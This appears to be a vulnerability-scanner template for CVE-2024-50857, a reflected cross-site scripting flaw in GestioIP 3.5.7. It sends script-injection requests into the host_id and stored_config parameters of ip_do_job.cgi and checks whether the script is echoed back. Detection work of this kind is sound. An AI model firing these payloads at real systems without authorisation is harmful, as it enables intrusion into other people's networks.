id: CVE-2024-50857

info:
  name: GestioIP XSS Vulnerability
  author: Gaurang
  severity: medium
  description: |
    The `ip_do_job` feature of GestioIP 3.5.7 is vulnerable to XSS, leading to data exfiltration and CSRF attacks. This template checks for reflected XSS in the `host_id` and `stored_config` parameters.
  tags: xss, gestioip, cve, reflected

http:
  - raw:
      - |
        GET /gestioip/res/cm/ip_do_job.cgi?client_id=1&host_id=<script>alert('test')</script> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "<script>alert('test')</script>"
        part: body

  - raw:
      - |
        GET /gestioip/res/cm/ip_do_job.cgi?client_id=1&stored_config=<script>alert('test')</script> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "<script>alert('test')</script>"
        part: body
